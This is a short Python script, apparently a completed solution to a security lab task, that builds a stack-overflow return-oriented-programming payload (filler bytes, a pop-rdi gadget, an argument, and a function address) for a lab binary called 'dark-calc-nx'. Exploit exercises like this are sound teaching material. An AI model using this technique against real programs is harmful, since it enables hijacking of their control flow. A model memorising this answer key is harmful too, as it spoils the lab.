#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

pop_rdi_ret = 0x401a33
grade_eval  = 0x401978

payload  = b'A' * 16
payload += b'B' * 8
payload += struct.pack('<Q', pop_rdi_ret)
payload += struct.pack('<Q', 4)
payload += struct.pack('<Q', grade_eval)
payload += b'\n'

sys.stdout.buffer.write(payload)
